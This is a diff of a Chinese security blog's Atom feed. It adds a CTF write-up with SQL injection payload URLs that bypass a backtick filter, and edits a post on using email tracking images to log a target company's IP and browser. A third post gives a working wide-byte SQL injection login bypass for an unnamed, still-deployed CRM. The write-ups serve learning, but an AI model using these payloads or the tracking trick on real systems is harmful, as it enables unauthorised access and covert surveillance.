@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://www.freev.cc/"/>
-  <updated>2017-05-01T14:43:53.323Z</updated>
+  <updated>2017-06-27T06:46:11.432Z</updated>
   <id>http://www.freev.cc/</id>
   
   <author>
@@ -15,16 +15,38 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[某ctf注入bypass]]></title>
+    <link href="http://www.freev.cc/2017/06/27/%E6%9F%90ctf%E6%B3%A8%E5%85%A5bypass/"/>
+    <id>http://www.freev.cc/2017/06/27/某ctf注入bypass/</id>
+    <published>2017-06-27T06:02:15.000Z</published>
+    <updated>2017-06-27T06:46:11.432Z</updated>
+    <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>群里面发出来得我就随便学习一下，源代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>]?<span class="variable">$_GET</span>[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    <span class="variable">$table</span> = Filter(<span class="variable">$table</span>);</span><br><span class="line">    mysqli_query(<span class="variable">$mysqli</span>,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    <span class="variable">$ret</span> = sql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>[<span class="number">0</span>];</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>payload(注意反引号 ‘ ` ‘,建议复制到文本查看):<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where id = 1%23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 1 xor sleep(2) %23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 1 union select  version() limit 1,1%23<br><a href="http://39.xx:5003/index.php?table=flag`--" target="_blank" rel="external">http://39.xx:5003/index.php?table=flag`--</a> `where 0 union select  COLUMN_NAME from  information_schema.COLUMNS  where table_name=0x7365637265745F666C6167  limit 0,1%23<br>拿到flag</p>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>原理总结<br>desc  遇到`– `  (注意两个-)会把第一个`(反引号)当成注释：<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc <span class="escape">`f</span>lag<span class="escape">`-</span>- <span class="escape">`w</span>here id = <span class="number">1</span>#`</span><br></pre></td></tr></table></figure></p>
+<p>但是在select语句种遇到`– `不会当注释:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="string">'flag&#123;xxx&#125;'</span> <span class="keyword">from</span> flag<span class="string">`-- `</span><span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span>#<span class="string">`</span></span></span><br></pre></td></tr></table></figure></p>
+<pre><code>`-- `可以用`/**/ `代替，但是desc `flag`/**/`where id = 1#` 不会返回内容，更多知识大家可以去探索，如果利用这道题会被拦截
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[bypass 绕过desc]]>
+    
+    </summary>
+    
+      <category term="sql注入" scheme="http://www.freev.cc/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[另一种信息收集技巧]]></title>
     <link href="http://www.freev.cc/2017/05/01/%E5%8F%A6%E4%B8%80%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E5%B7%A7/"/>
     <id>http://www.freev.cc/2017/05/01/另一种信息收集技巧/</id>
     <published>2017-05-01T12:04:32.000Z</published>
-    <updated>2017-05-01T14:43:53.323Z</updated>
+    <updated>2017-05-02T03:04:56.911Z</updated>
     <content type="html"><![CDATA[<h2 id="0x00__u5229_u7528"><a href="#0x00__u5229_u7528" class="headerlink" title="0x00 利用"></a>0x00 利用</h2><p>原理很简单，不多说了吧，大家一看就懂了。通过邮箱系统或者留言管理之类的系统插入一个允许的图片链接，一个你自己的外网服务器的链接就可以，然后等待对方打开你的链接，通过img 标签的src特性会自动请求你的链接，这事你可以通过apache日志查看对方请求的信息，</p>
 <p>这里以163邮箱为例，我们给我们想收集的公司发一个邮件：在添加图片按钮处选择网址url，然后填入自己外网服务器一个链接。<br><img src="./1111.png" width="80%" height="200" alt=""><br>这里也可以写一些简单的东西，欺骗一下读者，然后发送给对方，当对象打开邮箱查看时，你就可以查看自己的日志，以你为我用的是apache，这里就以apache为例：<br><img src="./2222.png" width="100%" height="10%" alt=""><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15.0.0.0 - - [01/May/2017:20:30:24 +0800] "GET /init.php HTTP/1.1" 200 224 "https://mail.qq.com/" </span><br><span class="line">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924</span><br></pre></td></tr></table></figure></p>
 <p>通过图片我们看出对方出口ip为：<br>    <em>.</em>.<em>.</em>(第一个字段)<br>    通过qq网页版打开<br>    使用chrome</p>
 <p></p>
-<h2 id="0x01__u603B_u7ED3"><a href="#0x01__u603B_u7ED3" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><p>这些信息在我们的渗透着还是有很大用处的，这里是以email为例。同样如果公司系统存在留言功能之类系统，同样可以利用，这里不再举例,；可以判断公司真实ip，以及大面发邮件探索公司网络扩谱。利用浏览器测试xss等。需要大家脑洞了。</p>
+<h2 id="0x01__u603B_u7ED3"><a href="#0x01__u603B_u7ED3" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><p>这些信息在我们的渗透着还是有很大用处的，这里是以email为例。同样如果公司系统存在留言功能之类系统，同样可以利用，这里不再举例,；可以判断公司真实ip，根据ip锁定地址（<a href="http://www.ipip.net/）以及大面发邮件探索公司网络扩谱。利用浏览器测试xss等。需要大家脑洞了。" target="_blank" rel="external">http://www.ipip.net/）以及大面发邮件探索公司网络扩谱。利用浏览器测试xss等。需要大家脑洞了。</a></p>
 <pre><code>Author:FreeV
 </code></pre><style>
     table{
@@ -43,6 +65,7 @@
         font-size: 18px;
         color:red;
     } 
+
 </style>]]></content>
     <summary type="html">
     <![CDATA[一种收集信息的方法:公司出口ip，内部邮箱系统客户端信息等。]]>
@@ -81,7 +104,7 @@
     <link href="http://www.freev.cc/2016/12/06/%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
     <id>http://www.freev.cc/2016/12/06/一次审计中遇到的问题/</id>
     <published>2016-12-06T07:08:36.000Z</published>
-    <updated>2016-12-06T08:25:47.960Z</updated>
+    <updated>2017-06-27T06:04:59.224Z</updated>
     <content type="html"><![CDATA[<h1 id="0x01__u67D0crm"><a href="#0x01__u67D0crm" class="headerlink" title="0x01 某crm"></a>0x01 某crm</h1><p>这个漏洞之前提交过，厂商不再关注了。就跟大家分享一下：因为现在很多企业，学校都再用，就不说厂商名字了。<br>代码是混淆过的，不过没关系，把eval 换成echo。运行 也会echo出源码。默认mysql链接字符集是gbk这很关键。直接导致宽字节注入。<br>密码验证函数是crypt。crypt是php自带的函数。自行百度吧。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function logincheck($username,$password)							&#123;</span><br><span class="line">trueglobal $db,$表前缀;</span><br><span class="line">true$SQL		= "SELECT * FROM ".$表前缀."user WHERE USER_ID = '$username'";</span><br><span class="line">true$rs			= $db-&gt;Execute($SQL);</span><br><span class="line">true$rs_a		= $rs-&gt;GetArray();</span><br><span class="line">true$USER_ID	= $rs_a[0]['USER_ID'];</span><br><span class="line">true$PASSWORDTEXT = $rs_a[0]['PASSWORD'];</span><br><span class="line">true//print crypt('', $PASSWORDTEXT) == $PASSWORDTEXT;</span><br><span class="line">true//print_R($password);print_R($PASSWORDTEXT);exit;</span><br><span class="line">trueif($USER_ID!="")												&#123;</span><br><span class="line">truetrueif(crypt($password,$PASSWORDTEXT) == $PASSWORDTEXT)			&#123;</span><br><span class="line">truetruetrue//密码正确</span><br><span class="line">truetruetruereturn $rs_a;</span><br><span class="line">truetruetrueexit;</span><br><span class="line">truetrue&#125;</span><br><span class="line">truetrueelse	&#123;</span><br><span class="line">truetruetrue//密码错误</span><br><span class="line">truetruetrue//print_R($password);print_R($username);exit;</span><br><span class="line">truetruetrueecho "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">truetruetrueexit;</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;</span><br><span class="line">trueelse	&#123;</span><br><span class="line">truetrue//用户名不存在</span><br><span class="line">truetrue//print_R($password);print_R($_POST);exit;</span><br><span class="line">truetrueecho "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">truetrueexit;</span><br><span class="line">true&#125;</span><br><span class="line">trueexit;</span><br></pre></td></tr></table></figure></p>
 <p>这里宽字节注入肯定没问题了，盲注，报错注入都是可以得。我试了似免登录还真绕过了，crypt函数验证密码，union select 可能帮助我们控制PASSWORDTEXT，并且password也是我们自己提交了.我们自己构造一个：<br>crypt(‘1’,’11b0WGZJEBWiw’)==’11b0WGZJEBWiw’)<br>提交：<br><code>username=1%df&#39; UNION SELECT 1,(select user_id from user limit 1),3,4,5,&#39;11b0WGZJEBWiw&#39;,7,8,9,10,11,12,13,14,15,16,17#&amp;password=1&amp;登录=登录</code><br>这时候会报错，因为后面的单引号被转移了没办法绕过，于是我一直在想怎么绕过，最后发现了这个方法用unhex，不过当unhex的参数是字母时还需要我们用单引号，那我们就再用一层unhex，说到这大家可能懂了<br><code>Select concat(unhex(313162305747),unhex(concat(unhex(35),unhex(41),unhex(34),unhex(41))),unhex(4542576977))</code><br>就是 11b0WGZJEBWiw<br>最后构造pl<br><code>username=1%df&#39; UNION SELECT 1,(select user_id from user limit 1),3,4,5,concat(unhex(313162305747),unhex(concat(unhex(35),unhex(41),unhex(34),unhex(41))),unhex(4542576977)),7,8,9,10,11,12,13,14,15,16,17#&amp;password=1&amp;登录=登录</code><br>成功绕过。</p>
 <h1 id="0x02__u603B_u7ED3"><a href="#0x02__u603B_u7ED3" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><pre><code>其实方法还有跟多，还是要看程序过滤哪些函数比如：char()函数，unhex()函数与concat()结合使用。
